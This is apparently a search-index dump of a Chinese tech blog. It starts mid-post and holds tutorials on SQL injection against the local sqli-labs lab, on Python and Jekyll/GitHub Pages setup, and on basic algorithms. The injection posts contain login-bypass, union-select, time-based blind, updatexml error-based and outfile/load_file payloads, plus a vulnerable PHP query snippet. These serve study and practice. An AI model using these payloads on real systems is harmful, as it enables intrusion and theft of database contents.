\n\t第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc\n\t第二个参数：XPath_string（Xpath格式的字符串）\n\t作用：从目标XML中返回包含所查询值的字符串\n\tupdatexml()\n\t第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc\n\t第二个参数：XPath_string（Xpath格式的字符串）\n\t第三个参数：new_value，String格式，替换查找到的符号条件的数据\n\t作用：改变文档中符合条件的节点的值\n\tsleep() 让此语句运行N秒钟\n\tif() \n\t>  SELECT IF(1>2,2,3);\n\t-> 3\n\tchar()\n\t返回整数ASCII代码字符组成的字符串\n\tSTRCMP() 比较字符串内容\n\tIFNULL() 假如参数1不为NULL，则返回值为参数1，否则其返回值为参数2\n\texp() 返回e的x次方\n\n---\n\n\t运行\n\tselect system_user(); \n\tselect user();\n\tselect current_user();\n\tselect session_user();\n\n\tselect show databases;\n\tuse security\n\tselect database();\n\n\tselect version();\n\tselect @@version;\n\tselect @@datadir;\n\tselect @@basedir;\n\tselect @@version_compile_os;\n\tselect count(*) from users;\n\tselect count(1) from users;\n\n\tselect concat(username,password) from users;\n\tselect concat_ws(',',username,password) from users;\n\tselect concat_ws(0x7e,username,password) from users;//~\n\tselect gruop_concat(username) from users;\n\n\tselect 'mysql' into outfile '/tmp/mysql';\n\tselect load_file('/tmp/mysql');\n\n\tselect ascii('a');\n\tselect ord('adkfjk'); // 字符串第一个字符的ascii\n\tselect mid('bdkfjk',1,1); // b 从第一位开始取第一个字符\n\tselect mid('bdkfjk',1,1); // bd\n\tselect substr('bdkfjk',1,2); //bd\n\tselect substr('bdkfjk',1,4); //bdkf\n\n\tselect length('dfdf'); // 4\n\n\tselect left('dfdfdf',2) // df\n\tselect floor(2.4); // 2\n\tselect floor(5.6); // 5\n\n\tselect rand(); // 0~1之间随机数\n\n\tselect sleep(2); \n\n\tselect if(1<2,2,3);\n\n\tchar(97);\n\n\tselect strcmp('a','b'); // -1 对比两个值\n\tselect strcmp('a','a'); // 0\n\n\tselect ifnull(null,1);\n\tselect ifnull(2,1);\n\n\tselect exp(2); // 自然对数e 的几次方\n\nXPath  \nhttp://www.w3school.com.cn/xpath/  \n\n\n\n#### MySql运算符\n算术运算符：  \n\n* \\+ 加法运算\n* - 减法运算\n* \\* 乘法运算\n* ／ 除法运算\n* % 求余运算\n* DIV 除法运算，同”／“\n* MOD 求余运算，同”%“\n\n比较运算符：\n  \n* \\> 大于\n* < 小于\n* = 等于\n* \\>= 大于等于\n* <= 小于等于\n* != 或 <> 不等于\n* IS NULL 为空\n* IS NOT NULL 不为空\n* BETWEEN AND 在..之间\n* IN 包含\n* NOT IN 不包含\n* LIKE 模式匹配\n* NOT LIKE 模式匹配\n* REGEXP 正则表达式\n\n逻辑运算符：  \n\n* && 或 AND 与\n* \\|\\| 或 OR 或\n* ! 或 NOT 非\n* XOR 异或\n\n\n---\n\n\tselect 1+2;\n\t\n\tselect id,username from users where id between 1 and 4;\n\t\n\tselect id,username from users where username in ('admin','tesdt');\n\t\n\tselect id,username from users where username not in ('admin','tesdt');\n\t\n\tselect id,username from users where username like 'admin';\n\t\n\tselect id,username from users where username like '%ad%';\n\t\n\tselect user() regexp 'root';\n\t\n\t\t\n\t\n### 02 逻辑运算\n#### 逻辑运算符： AND <--> OR\n\n\tselect * from users where id=1; // true\n\tselect * from users where id=1 and 1=1; // true\n\tselect * from users where id=1 and 1=2; // false 返回 empty\n\t\n\tselect * from users where id=1 or 1=2; // true \n\t\n\t\n---\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/01.jpeg)\n\n\t登录处的SQL语句：\n\tselect * from users where username='admin' and pwd='pass';\n\t'or '1' = '1\n\tselect * from users where username=''or '1'='1' and pwd=''or '1' = '1';\n\t\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/02.jpeg)\n\n\tand 1=2 union select 1,2,3-- // 1=2 false 执行union后面的语句\n\tselect user() regexp '^ro' // ro开头的用户\n\tascii(substr(select user()),1,1)=114 // 用户名为r的用户\n\tif(ascii(substr((select user(),1,1))=114,0,sleep(5))) // 如果用户名第一个字母是r就返回0，否则睡5秒\n\t(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=9) \n\tupdatexml(1,concat(0x7e,(select @@version),0x7e),1) // 报错信息打印版本\n\t\n\t\n---\n\n\thttp://127.0.0.1/Less-1/?id=1 and 1=2 union select 1,2,3--+\n\thttp://127.0.0.1/Less-1/?id=1 and 1=2 union select 1,user(),3--+\n\t\n\n","tags":["sql注入","web安全"],"categories":["web安全"]},{"title":"1.1.1-SQL注入-SQL注入基础-SQL注入原理分析","url":"/post/1730261069.html","content":"\n## SQL注入原理分析\n\n### SQL注入背景介绍-SQL语言介绍\nsql 结构化查询语言  \n通用的功能极强的关系数据库标准语言  \n功能包括查询、操纵、定义和控制四个方面  \n不需要告诉SQL如何访问数据库，只要告诉SQL需要数据库做什么 \n\n### SQL注入产生原因\n网络技术与信息技术高速发展，B/S模式具有界面统一，使用简单，易于维护，扩展性好，共享度高等优点，B/S模式越来越多的被应用于程序编写中。  \n\n1. B/S建立在互联网，对安全控制能力较弱\n2. 开发人员水平和经验参差不齐，没有在编写代码时对用户的输入数据或者页面携带信息进行必要的合法性判断。  \n\n攻击者利用这个机会**提交一段数据库查询代码**，根据程序返回的结果，就可以获得一些数据库信息。\n\n### SQL注入核心原理\n\nSQL注入是一种将恶意的SQL代码**插入或添加到应用（用户）的输入参数**的攻击，攻击者探测出开发者编程过程中的漏洞，利用这些漏洞，巧妙的**构造SQL语句**对数据库系统的内容进行直接**检索或修改**。\n\n\n灵活的SQL查询语句+用户输入的数据带入了SQL语句=用户直接操作数据库->**SQL注入漏洞**\n\n\tselect version();\n\tselect id from where id=1;\n\tselect id from jobs where id=1 union select version();\n\n\tselect id.location from jobs where id=1 union select 1,version();  // 1是占位\n\n用户输入可控，代码对用户输入进行了拼接，带入SQL语句，产生SQL注入漏洞\n\nhttp://test.com/index.php?id=1*UNION SELECT 1,version()#*\n\n\n\t$id=$_GET['id'];// id没做处理\n\t$sql=\"SELECT * FROM users WHEre id='$id' LIMIT 0,1\"\n\n\tselect id,location from jobs where id=1 union select 1,version()#\n\n\n<br/>\n\n\tdocker ps --help\n\tdocker ps -a\n\tdocker exec -it <id> /bin/bash\n\tmysql\n\tshow databases;\n\tuse security;\n\tshow tables;\n\n\tselect * from users;\n\tselect username from users where id=1;\n\tselect username,password from users where id=1;\n\n\tselect 1;\n\tselect 1123;\n\tselect version();\n\tselect username,password from users where id=1 union select version();\n\tselect username,password from users where id=1 union select 1,version();\n\n\tselect * from users where id=1 limit 0,1;\n\tselect * from users where id=-1 union select 1,2,version()# limit 0,1;\n\n\t// 浏览器\n\thttp://127.0.0.1:90/Less-1/?id=1%27%20union%20select%201,2,3%23\n\t?id=1' union select 1,2,3\n\t// %23 #\n\n\thttp://127.0.0.1:90/Less-1/?id=-1%27%20union%20select%201,version(),3%23\n\t?id=-1' union select 1,version(),3\n\t// 需要让它出个错\n\n\t// 控制台\n\t// 退出mysql\n\texit\n\n\tcd /var/www/html/Less-1\n\tcat index.php\n\tvi index.php\n\t// 编辑\n\techo $sql\n\t:wq\n\n\ntodo sqli-labs源码地址\n\n\tdocker ps -a\n\tdocker exec -it <id> /bin/bash\n\tcd /var/www/html/Less-1\n\n\n","tags":["sql注入","web安全"],"categories":["web安全"]},{"title":"1.1.1-SQL注入-SQL注入基础-SQL注入练习环境搭建","url":"/post/2284174451.html","content":"\n## SQL注入练习环境搭建\nSqli-labs  \nhttps://github.com/Audi-1/sqli-labs  \n+ 报错注入  \n+ 盲注\n+ Update注入\n+ Insert注入\n+ Header注入\n+ 二阶注入\n+ 绕过WADF\n\n1. PHP+MySql+Apache  \nWAMP  \nwindows  \n\n+ 下载安装WAMP http://www.wampserver.com/en/\n+ WAMP的www目录下 解压缩sqli-labs\n+ 启动服务器\n+ 配置数据库（root）phpMyadamin \n+ 修改配置 sqli-labs/sql-connections/db-creds.inc\n+ http://localhost/sqli-labs  点击 setup/reset database for labs\n\n2. Docker\n+ docker search sqli-labs\n+ docker pull acgplano/sqli-labs\n+ docker images\n+ docker run -dt \\-\\-name sqli -p 80:80 \\-\\-rm acgplano/sqli-labs  (-dt 后台运行 --name 命名 -p 端口名  80:80 本地：docker \\-\\-rm 当停止后删除产生镜像)\n\n\n### tips\n对应代码，边看代码边理解，学会一半，就基本没问题。  \n","tags":["sql注入","web安全"],"categories":["web安全"]},{"title":"python搭建环境","url":"/post/165310662.html","content":"\n[python](https://www.python.org/)\n\n## 环境\nanaconda（python环境、python包）  \n[anaconda链接](https://www.anaconda.com/download/)\n\n## 命令\n\n\tconda list // 查看所有安装的python库  \n\n\tpip install <name> // 安装库\n\tpip install xgboost  \n\n\tconda install <name>\n\n## Notebook工具\n\n\tshift+enter 运行命令\n\n\t// 打印当前路径\n\timport os\n\tprint(os.path.abspath('.'))\n\n## Python应用\n\n* 基础编程开发\n* Web开发\n* 运维开发\n* 机器学习\n* 深度学习\n* 计算机视觉与自然语言处理\n* 数据挖掘\n* Spark大数据系列\n","tags":["python"],"categories":["python"]},{"title":"1.使用jekyll搭建个人博客","url":"/post/54451516.html","content":"\n# 一、GitHub Pages的配置\n## 1.申请github账号\n首先要注册github账户  \n访问下面的网址  \nhttps://github.com/  \n点击Sign up for GitHub 按钮注册  \n\n![注册github](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-1.png)\n\n注册成功后点击Sign in 按钮 登录  \n登录成功后验证下邮箱\n\n## 2.创建项目\n选择Start a project 按钮 开始一个项目  \n\n![start a project](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-2.png)\n\n填写   用户名.github.io  \n点击Create repository 按钮  \n\n![create a new repository](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-3.png)\n\n## 3.配置ssh\n打开终端  \n输入命令 \n \n\tssh-keygen -t rsa  \n一直回车  \n\n![ssh](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-3.png)\n\n输入命令  \n\n\topen ~/.ssh  \n\n![ssh](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-4.png)\n\n之后会打开.ssh文件夹  \n打开id_rsa.pub文件  \n\n![ssh](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-5.png)\n\n复制里面内容  \n登录github 点击头像 ->点击Settings 按钮  \n\n![settings](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-7.png)\n\n点击左侧 SSH and GPG keys  \n\n![settings](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-9.png)\n\n之后点击New SSH key 按钮  \n\n![ssh key](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-10.png)\n\nTitle 随便填  \nKey 添加复制的内容  \n点击Add SSH Key 按钮  \n\n![ssh key](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-11.png)\n\n终端输入  \n\n\tssh -T git@github.com  \n出现下面这个就是成功了  \n\n![ssh](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-12.png)\n\n## 4.上传代码到github\n终端输入\n  \n\tgit clone git@github.com:用户名/用户名.github.io.git  \n\tcd 用户名.github.io/  \n\techo \"Hello World\" > index.html  \n\t\n\tgit init  \n\tgit add --all  \n\tgit commit -m \"first commit\"  \n\tgit remote add origin git@github.com:用户名/用户名.github.io.git  \n\n如果出现  fatal: remote origin already exists.  \n\n![fatal](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-13.png)\n\n就输入  \n\n\tgit remote rm origin  \n\n再输入  \n\n\tgit remote add origin git@github.com:用户名/用户名.github.io.git  \n\tgit push  -u origin master\n\t\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-14.png)\n\n## 5.访问博客页面\n打开浏览器  \n输入  \nhttps://用户名.github.io  \n就会显示出Hello World  \n就代表成功了  \n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-15.png)\n\n---\n\n# 二、jekyll配置\n\n## 1.jekyll本地配置\nwindows的小伙伴可以看这个文章   \nhttps://www.jianshu.com/p/88e3474cef72  \n\n配置jekyll环境  \njekyll官网https://www.jekyll.com.cn/ 有不懂的可以参考下  \n\n打开终端输入\n\n\tgem install jekyll\n\tjekyll new my-site\n\t\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-16.png)\n\n终端输入\n\n\tcd my-site/\n\tjekyll serve\n\n浏览器访问  \nhttp://127.0.0.1:4000/\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-17.png)\n\n出现下面这个界面，代表jekyll本地运行成功\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-18.png)\n\n## 2.jekyll代码上传github\n打开my-site文件夹  \n复制所有文件  \n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-19.png)\n\n再打开 用户名.github.io 文件夹  \n删除index.html  \n把复制的文件粘贴用户名.github.io 文件夹  \n\n\n打开终端输入  \ncd 用户名.github.io  \ngit add --all  \ngit commit -m  \"add jekyll\"  \ngit push -u origin master  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-21.png)\n\n浏览器访问  \nhttps://用户名.github.io/  \n出现这个就上传github成功了，如果没出现，就清除下浏览器缓存再试试  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-22.png)\n\n## 3.添加文章\n所有文章默认都在_posts文件夹中\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-23.png)\n\n你要做的是点击 _posts文件夹  \n新建  \nYYYY-MM-DD-文章标题.markdown  \n\n其中YYYY为4位年份，MM是两位的月份，DD是两位的日期  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-24.png)\n\n在用文本编辑器打开它\n复制下面\n\n\t---\n\tlayout: post\n\ttitle: test\n\t---\n\t\n\thello world\n\t\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-25.png)\n然后保存关闭  \n打开终端输入  \n\n\tjekyll serve\t\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-26.png)\n\n浏览器访问 http://127.0.0.1:4000/  \n就会出现你添加的文章  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-27.png)\n\n## 4.把文章上传到github\n打开终端\n\n\tcd 用户名.github.io\n\tgit add --all\n\tgit commit -m \"add post\"\n\tgit push -u origin master\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-28.png)\n\n上传成功后  \n访问  \nhttps://用户名.github.io/  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/01/image-29.png)\n","tags":["blog"],"categories":["jekyll"]},{"title":"算法基础1","url":"/post/155300231.html","content":"\n\n### 0001 算法基础\n\n什么是算法？\n\n完成一个任务所需的一系列步骤\n\n计算机算法解决问题 两个必要条件\n1.1 正确性\n\n 加密算法： 使用高效算法得到正确性 但是会有错误的几率 可以加以控制 使得错误率降到足够低\n\n 近似算法： 量化速度来寻找最优解 -> 在合理时间求出”近似最优“解\n\n\n1.2 资源利用\n\n 时间 内存占用率 网络通信 随机比特(随机数算法产生的随机数的资源) 磁盘操作(处理存储在磁盘上的数据的算法)\n\n\n------------\n\n\n线性查找x的位置\n\n程序 LINEAR SEARCH(A, n, x)\n\t输入：\n\tA 一个数组\n\tn 要查找的数组A中的元素个数\n\tx 要查找的值\n\n\t输出：\n\t要么满足A[i] = x 的索引i 要么是一个特殊值NOT-FOUND\n\n\t1将 answer 赋值 为 NOT-FOUND \n\t2对每个索引值i 按顺序从1取到n\n\t A. 如果A[i] = x 那么将answer赋值为i\n\t3返回answer的值并作为输出\n","tags":["算法"],"categories":["算法"]}]